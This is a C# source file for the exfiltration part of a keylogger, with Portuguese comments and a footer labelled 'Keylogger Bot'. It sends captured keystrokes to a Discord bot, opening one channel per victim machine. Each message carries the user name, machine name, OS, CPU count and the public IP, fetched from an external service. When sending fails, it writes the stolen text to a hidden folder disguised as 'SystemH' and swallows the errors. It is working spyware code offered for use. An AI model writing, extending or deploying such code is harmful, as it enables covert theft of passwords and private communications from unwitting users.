using DSharpPlus;
using DSharpPlus.Entities;
using System.Collections.Concurrent;
using System.Text;
using System.Text.RegularExpressions;

public class DiscordLogger : IAsyncDisposable
{
    private readonly DiscordClient _client;
    private readonly ulong _logGuildId;
    private readonly ulong _machineCategoryId;
    private readonly HttpClient _http;

    private static readonly ConcurrentDictionary<string, SemaphoreSlim> _channelLocks = new();
    private static readonly ConcurrentDictionary<string, ulong> _channelCache = new();
    private readonly SemaphoreSlim _sendSemaphore = new(1, 1);

    public DiscordLogger(string botToken, ulong logGuildId, ulong machineCategoryId, HttpClient? httpClient = null)
    {
        _logGuildId = logGuildId;
        _machineCategoryId = machineCategoryId;
        _http = httpClient ?? new HttpClient();


        _client = new DiscordClient(new DiscordConfiguration
        {
            Token = botToken,
            TokenType = TokenType.Bot,
            Intents = DiscordIntents.AllUnprivileged | DiscordIntents.MessageContents,
        });
    }

    public async Task InitializeAsync()
    {
        await _client.ConnectAsync().ConfigureAwait(false);
        var tcs = new TaskCompletionSource<bool>();


        _client.Ready += (s, e) =>
        {
            tcs.TrySetResult(true);
            return Task.CompletedTask;
        };


        await Task.WhenAny(tcs.Task, Task.Delay(10000)).ConfigureAwait(false);
    }

    private static string NormalizeChannelName(string s)
    {
        var lower = s.ToLowerInvariant();
        var sb = new StringBuilder();


        foreach (char c in lower)
        {
            if ((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
                sb.Append(c);
            else
                sb.Append('-');
        }


        var collapsed = Regex.Replace(sb.ToString(), "-+", "-").Trim('-');
        return collapsed.Length > 100 ? collapsed.Substring(0, 100) : collapsed;
    }

    public async Task<DiscordChannel> GetOrCreateMachineChannelAsync(string machineName)
    {
        string channelName = NormalizeChannelName(machineName);

        if (_channelCache.TryGetValue(channelName, out var cachedId))
        {
            try
            {
                var ch = await _client.GetChannelAsync(cachedId).ConfigureAwait(false);
                if (ch != null && ch.Name == channelName) return ch;
                _channelCache.TryRemove(channelName, out _);
            }
            catch
            {
                _channelCache.TryRemove(channelName, out _);
            }
        }


        var sem = _channelLocks.GetOrAdd(channelName, _ => new SemaphoreSlim(1, 1));
        await sem.WaitAsync().ConfigureAwait(false);
        try
        {
            var guild = await _client.GetGuildAsync(_logGuildId).ConfigureAwait(false);
            var existing = guild.Channels.Values.FirstOrDefault(c => c.Name == channelName);
            if (existing != null)
            {
                _channelCache[channelName] = existing.Id;
                return existing;
            }


            DiscordChannel? category = null;
            try
            {
                category = guild.Channels.Values.FirstOrDefault(c => c.Id == _machineCategoryId && c.Type == ChannelType.Category);


                if (category == null && _machineCategoryId != 0)
                {
                    var maybe = await _client.GetChannelAsync(_machineCategoryId).ConfigureAwait(false);
                    if (maybe != null && maybe.Type == ChannelType.Category)
                        category = maybe;
                }
            }
            catch
            {
                category = null;
            }


            DiscordChannel newChannel;
            if (category == null)
            {
                Console.Error.WriteLine($"Categoria {_machineCategoryId} inválida ou não encontrada. Criando canal sem categoria.");
                newChannel = await guild.CreateTextChannelAsync(channelName, topic: $"Logs da máquina {machineName}").ConfigureAwait(false);
            }
            else
            {
                newChannel = await guild.CreateTextChannelAsync(channelName, parent: category, topic: $"Logs da máquina {machineName}").ConfigureAwait(false);
            }


            _channelCache[channelName] = newChannel.Id;
            return newChannel;
        }
        finally
        {
            sem.Release();
        }
    }

    public async Task SendLogAsync(string machineName, string userName, string osVersion, string cpuCount, string capturedText)
    {
        await _sendSemaphore.WaitAsync().ConfigureAwait(false);
        try
        {
            var channel = await GetOrCreateMachineChannelAsync(machineName).ConfigureAwait(false);


            string publicIp;
            try
            {
                publicIp = (await _http.GetStringAsync("https://api.ipify.org").ConfigureAwait(false)).Trim();
            }
            catch
            {
                publicIp = "Não disponível";
            }


            if (capturedText.Length > 1800)
            {
                capturedText = capturedText.Substring(capturedText.Length - 1800);
                capturedText = "...[truncado]...\n" + capturedText;
            }


            var embed = new DiscordEmbedBuilder()
            .WithTitle("📝 Novo Texto Capturado")
            .WithColor(DiscordColor.Blurple)
            .WithTimestamp(DateTimeOffset.UtcNow)
            .WithFooter("Keylogger Bot")
            .AddField("👤 Usuário", userName, true)
            .AddField("🖥️ Máquina", machineName, true)
            .AddField("🛠️ OS", osVersion, true)
            .AddField("⚙ CPUs", cpuCount, true)
            .AddField("🌐 IP Público", publicIp, true)
            .AddField("📋 Texto Capturado", $"```{capturedText}```")
            .Build();


            await channel.SendMessageAsync(embed).ConfigureAwait(false);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Erro ao enviar log para Discord: {ex.Message}");
            await SaveToBackupLogAsync(machineName, userName, capturedText, ex.Message).ConfigureAwait(false);
        }
        finally
        {
            _sendSemaphore.Release();
        }
    }

    private async Task SaveToBackupLogAsync(string machineName, string userName, string capturedText, string error)
    {
        try
        {
            string backupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "SystemH", "SystemHBackup");
            Directory.CreateDirectory(backupDir);


            DirectoryInfo dirInfo = new DirectoryInfo(backupDir);
            if (!dirInfo.Attributes.HasFlag(FileAttributes.Hidden))
            {
                dirInfo.Attributes |= FileAttributes.Hidden;
            }


            string backupFile = Path.Combine(backupDir, $"SystemH_{DateTime.Now:yyyyMMdd}.log");
            string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {machineName} - {userName}\n" +
            $"Discord Error: {error}\n" +
            $"Content: {capturedText}\n" +
            "---\n\n";


            await File.AppendAllTextAsync(backupFile, logEntry, Encoding.UTF8).ConfigureAwait(false);


            FileInfo fileInfo = new FileInfo(backupFile);
            if (!fileInfo.Attributes.HasFlag(FileAttributes.Hidden))
            {
                fileInfo.Attributes |= FileAttributes.Hidden;
            }
        }
        catch
        {
            // Ignora erros de backup
        }
    }

    public async ValueTask DisposeAsync()
    {
        try
        {
            if (_client != null)
            {
                await _client.DisconnectAsync().ConfigureAwait(false);
                _client.Dispose();
            }
        }
        catch
        {
            // Ignora erros de cleanup
        }
        finally
        {
            _http?.Dispose();
        }
    }
}